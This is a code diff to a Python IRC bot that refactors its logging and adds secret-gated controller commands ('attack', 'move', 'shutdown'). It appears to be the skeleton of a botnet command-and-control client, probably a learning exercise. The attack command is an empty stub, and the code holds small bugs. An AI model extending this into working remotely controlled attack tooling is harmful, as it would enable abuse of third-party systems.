@@ -85,7 +85,7 @@ class Bot:
         """
 
         msg = bytes(msg)
-        print("--> sending: {0}{1}{2}".format(colors.BLUE, msg, colors.ENDC))
+        eprint("--> sending: {0}{1}{2}".format(colors.BLUE, msg, colors.ENDC))
         self._socket.send(msg)
         
     def logRecv(self):
@@ -98,7 +98,7 @@ class Bot:
         If only one message is received, the array will be of size 1
         """
         response = self._socket.recv(1024).decode("utf-8")
-        print("<-- received: {0}{1}{2}".format(colors.WARNING, response, colors.ENDC))
+        eprint("<-- received: {0}{1}{2}".format(colors.WARNING, response, colors.ENDC))
         responses = response.split("\r\n")
         return responses[:len(responses) - 1]
 
@@ -114,9 +114,9 @@ class Bot:
         """ 
         logs a single command's prefix, command, and arguments for debugging purposes. 
         """
-        print("prefix: {0}".format(prefix))
-        print("command: {0}".format(command))
-        print("args: {0}".format(args))
+        eprint("prefix: {0}".format(prefix))
+        eprint("command: {0}".format(command))
+        eprint("args: {0}".format(args))
 
 
     def doWork(self):
@@ -128,7 +128,7 @@ class Bot:
             self.initConnection()
 
             responses = self.logRecv()
-            while len(responses) > 0 and self._shutdown != True:
+            while self._shutdown != True and len(responses) > 0:
                 for response in responses:
                     prefix, command, args = self.parsemsg(response)
                     
@@ -144,36 +144,29 @@ class Bot:
                         self.pickNewName()
                         self.initConnection()
                     elif command == "PRIVMSG":
-                        sender = prefix
+                        sender = prefix[:prefix.index("!")]
                         channel = args[0]
                         msg = args[1]
 
-                        sender = sender[:sender.index("!")]
-
                         eprint("message from {0}".format(sender))
-
-                        if msg == "heyyy what up mah glip glops?":
-                            eprint("yoyoyo")
-                            response = "PRIVMSG {0} :{1}\r\n".format(sender, "what is my purpose?").encode('utf-8')
-                            self.logSend(response)
+                        self.parsePrivMsg(sender, msg)
                             
                     elif command == "ERROR":                        
                         eprint("!! Server sent error, could be connecting too quick, wait 10 seconds..")
                         sys.stdout.flush()
                         time.sleep(10)
-            
-                responses = self.logRecv()
+                if self._shutdown != True:
+                    responses = self.logRecv()
 
-            print("Exitted loop for some reason.......")
-            print("{0}".format(responses))
+            
         except KeyboardInterrupt:
             #in case we'd like
             raise
         except:
             #other exception, continue to reconnect
-            print("Error encountered: ")
-            print(traceback.format_exc())
-            print("Waiting 10 seconds before reconnect...")
+            eprint("Error encountered: ")
+            eprint(traceback.format_exc())
+            eprint("Waiting 10 seconds before reconnect...")
             sys.stdout.flush()
             time.sleep(10)
             pass
@@ -181,7 +174,49 @@ class Bot:
         #if we haven't received the shutdown command, boot 'er back up
         if not self._shutdown:
             self.connectAndRun()
+        else:
+            print("{0}Received shutdown signal{1}".format(colors.FAIL, colors.ENDC))
+
+    def parsePrivMsg(self, sender, msg):
+    
+        if msg == "heyyy what up mah glip glops?":
+            response = "PRIVMSG {0} :{1}\r\n".format(sender, "what is my purpose?").encode('utf-8')
+            self.logSend(response)
+        else:
+            msgParts = msg.split()
+
+            #we dont support any commands less than 2. Require: "secret command [command_params]"
+            if len(msgParts) < 2:
+                return
+            
+            secret = msgParts[0]
+
+            if secret == self._secret:
+                command = msgParts[1]
                 
+                print("Controller requested we run command: {0}".format(command))
+                if command == "attack":
+                    pass
+                elif command == "move":
+                    if len(msgParts) == 4:
+                        server = msgParts[2]
+                        try:
+                            port = int(msgPars[3])
+                            if port >= 1 and port <= 65535:
+                                #handle server name resolution
+                                
+                                self._server = socket.gethostbyname_ex(server)
+                                self._port = port
+                                
+                            else:
+                                eprint("Ignoring move command. Port not between 1 and 65535.")
+                        except:
+                            eprint("Ignoring move command. Port malformed.")
+                elif command == "shutdown":
+                    self._shutdown = True
+
+        
+            
     def pickNewName(self):
         """ 
         set a new name for the bot. Called on startup and repeatedly if name is taken.
